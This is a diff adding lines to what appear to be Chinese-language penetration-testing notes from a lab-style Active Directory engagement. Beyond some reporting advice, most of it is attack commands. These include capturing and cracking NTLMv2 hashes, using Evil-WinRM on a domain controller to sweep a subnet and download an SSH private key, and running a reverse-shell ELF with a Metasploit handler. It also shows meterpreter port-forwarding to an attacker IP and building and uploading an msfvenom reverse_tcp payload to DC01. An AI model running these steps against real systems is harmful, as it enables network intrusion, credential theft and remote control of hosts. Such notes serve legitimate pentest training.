@@ -476,3 +476,31 @@ C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
 复制哈希到 hash 文件
 hashcat -m 5600 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
 
+
+仅出现、攻陷客户并炫耀你多快获得 DA 对客户没有任何好处
+在获得域管理员权限后所做的事情极其重要
+能提供一点额外的价值，也能领先于同行
+不用无意义的发现来夸大报告，可以发现许多客户从未考虑过的事情
+
+发现一个特别敏感的文件共享，应该只截取显示文件列表的屏幕截图
+单独的站点或未加入域的文件共享或备份服务器来存放敏感数据
+不应该能从主域的主机直接访问，获得域管理员权限也不应
+
+*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ipconfig /all    查看域控制器上的网络适配器，看到第二个网卡 (NIC)，位于 172.16.9.0 网络
+*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}      扫描存活主机
+*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa       下载密钥
+
+开始双跳      攻击机 -> dmz01 -> DC01 -> MGMT01
+>> use exploit/multi/handler
+root@dmz01:/tmp# chmod +x shell.elf 
+root@dmz01:/tmp# ./shell.elf 
+>> exploit
+>> portfwd add -R -l 8443 -p 1234 -L 10.10.14.15      dmz01:1234 -> 攻击机:8443
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234      给 DC01 的 pl
+*Evil-WinRM* PS C:\> upload "/home/tester/dc_shell.exe"      传到 DC01
+
+域密码分析工具：
+  https://github.com/clr2of8/DPAT
+域安全审计工具：
+  https://www.pingcastle.com/
+
